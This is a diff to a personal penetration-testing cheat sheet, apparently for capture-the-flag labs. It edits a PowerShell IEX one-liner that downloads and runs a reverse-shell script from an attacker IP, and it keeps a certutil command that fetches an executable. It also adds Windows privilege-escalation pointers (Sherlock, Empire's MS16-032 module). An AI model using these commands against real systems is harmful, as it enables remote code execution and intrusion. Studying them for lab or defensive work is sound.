@@ -40,9 +40,10 @@ JAWS --> https://github.com/411Hall/JAWS.git
 
 DOWNLOAD SHELL POWERSHELL
 
-cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev2.ps1')  (may need to escape quotes)
+cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
 AVOID BAD CHARACTERS --> convert to windows file format
 iconv -t UTF-16LE | base64-w0 
+powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
 
 DOWNLOAD FILE CMD/PS
 certutil -urlcache -split -f http://10.10.10.10/agent.exe C:\\users\\public\\agent.exe #CMD
@@ -54,7 +55,9 @@ PRIVESC WINDOWS
 whoami /priv
 # if SeImpersonatePrivilege is enabled --> juicy/rotten potato
 systeminfo
-metasploit local_exploit_suggester
+metasploit local_exploit_suggester --> find vulns
+sherlock --> find vulns
+MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
 
 
 LINUX
@@ -63,7 +66,7 @@ LINUX
 
 
 
-USEFULL COMMANDS
+USEFULL COMMANDS.ps1
 tcpdump -i tun0 icmp
 python -m SimpleHTTPServer 80
 
@@ -74,6 +77,8 @@ nishang --> https://github.com/samratashok/nishang.git
 JAWS  --> enumeration https://github.com/411Hall/JAWS.git
 impacket --> https://github.com/SecureAuthCorp/impacket.git
 webshells --> https://github.com/BlackArch/webshells.git
+sherlock --> https://github.com/rasta-mouse/Sherlock
+empire --> https://github.com/EmpireProject/Empire.git
 APT
 gobuster
 mdbtools
